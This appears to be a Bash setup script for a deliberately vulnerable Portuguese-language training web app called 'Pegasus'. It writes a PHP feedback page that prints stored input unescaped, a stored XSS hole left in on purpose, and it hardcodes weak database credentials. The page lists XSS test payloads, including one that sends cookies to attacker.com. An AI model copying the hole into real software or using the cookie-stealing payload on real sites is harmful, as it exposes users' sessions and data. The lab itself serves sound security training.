#!/bin/bash
# Componente para correção do feedback.php

create_feedback_php() {
    log_message "${BLUE}${MSG_INFO}" "Melhorando feedback.php..."
    
    cat > "$APP_DIR/app/feedback.php" << 'PHP'
<?php
session_start();

try {
    $pdo = new PDO('mysql:host=pegasus-db;dbname=pegasus', 'pegasus', 'pegasus123');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Erro de conexão: " . $e->getMessage());
}

$msg = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = isset($_POST['name']) ? trim($_POST['name']) : '';
    $comment = isset($_POST['comment']) ? trim($_POST['comment']) : '';
    
    if (empty($name) || empty($comment)) {
        $error = "❌ Por favor, preencha todos os campos";
    } else {
        try {
            $stmt = $pdo->prepare("INSERT INTO feedback (name, comment, created_at) VALUES (?, ?, NOW())");
            $stmt->execute([$name, $comment]);
            
            error_log("[PEGASUS] Feedback submitted by: $name from IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
            
            $msg = "✅ Feedback enviado com sucesso! Obrigado pela sua contribuição.";
        } catch (PDOException $e) {
            $error = "❌ Erro ao salvar feedback: " . $e->getMessage();
        }
    }
}

try {
    $feedbacks = $pdo->query("SELECT * FROM feedback ORDER BY created_at DESC LIMIT 20")->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    $feedbacks = [];
    $error = "❌ Erro ao carregar feedbacks: " . $e->getMessage();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Feedback - Pegasus</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
        .container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
        .feedback-form { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; }
        .feedback-item { border: 1px solid #ddd; padding: 20px; margin: 15px 0; border-radius: 8px; background: #fff; }
        .feedback-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        .vuln-info { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 8px; margin-top: 20px; }
        .msg { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .error { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .stats { background: #e3f2fd; border: 1px solid #bbdefb; padding: 15px; border-radius: 8px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>💬 Sistema de Feedback Corporativo</h2>
        <p>Compartilhe suas sugestões, críticas e elogios para melhorarmos nossos serviços.</p>
        
        <?php if($msg): ?>
        <div class="msg"><?= $msg ?></div>
        <?php endif; ?>
        
        <?php if($error): ?>
        <div class="error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        
        <div class="feedback-form">
            <h3>📝 Enviar Novo Feedback</h3>
            <form method="post">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: bold;">👤 Seu Nome:</label>
                    <input name="name" 
                           placeholder="Digite seu nome completo" 
                           required 
                           maxlength="100"
                           style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;">
                </div>
                
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: bold;">💭 Seu Comentário:</label>
                    <textarea name="comment" 
                              placeholder="Compartilhe sua opinião, sugestão ou crítica..." 
                              required 
                              maxlength="1000"
                              rows="5"
                              style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; resize: vertical;"></textarea>
                </div>
                
                <button type="submit" 
                        style="padding: 12px 25px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px;">
                    📤 Enviar Feedback
                </button>
            </form>
        </div>
        
        <?php if(!empty($feedbacks)): ?>
        <div class="stats">
            <strong>📊 Estatísticas:</strong> <?= count($feedbacks) ?> feedback(s) recente(s) | 
            <strong>Último:</strong> <?= date('d/m/Y H:i', strtotime($feedbacks[0]['created_at'])) ?>
        </div>
        
        <h3>💬 Feedbacks Recentes</h3>
        <?php foreach($feedbacks as $fb): ?>
        <div class="feedback-item">
            <div class="feedback-header">
                <strong style="color: #007bff;">👤 <?= $fb['name'] ?></strong>
                <small style="color: #666;">📅 <?= date('d/m/Y H:i', strtotime($fb['created_at'])) ?></small>
            </div>
            <div style="margin-top: 10px; line-height: 1.5;">
                <?= $fb['comment'] ?>
            </div>
        </div>
        <?php endforeach; ?>
        <?php else: ?>
        <div style="text-align: center; padding: 40px; color: #666;">
            <h3>😊 Seja o primeiro a deixar um feedback!</h3>
            <p>Sua opinião é muito importante para nós.</p>
        </div>
        <?php endif; ?>
        
        <div class="vuln-info">
            <strong>🎯 VULNERABILIDADE: Cross-Site Scripting (XSS) Stored</strong><br>
            <strong>Risco:</strong> Execução de JavaScript malicioso no navegador<br>
            <strong>Impacto:</strong> Roubo de cookies, redirecionamento, defacement<br>
            <strong>Testes de Penetração:</strong><br>
            • <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - XSS básico<br>
            • <code>&lt;img src=x onerror=alert('XSS')&gt;</code> - XSS via atributo<br>
            • <code>&lt;script&gt;document.location='http://attacker.com/'+document.cookie&lt;/script&gt;</code> - Cookie stealing<br>
            • <code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code> - XSS via iframe<br>
            <strong>CVSS Score:</strong> 6.1 (Medium)
        </div>
        
        <p style="margin-top: 30px;"><a href="index.php" style="text-decoration: none; color: #007bff;">← Voltar ao Portal</a></p>
    </div>
</body>
</html>
PHP
    
    log_message "${GREEN}${MSG_SUCCESS}" "feedback.php melhorado"
}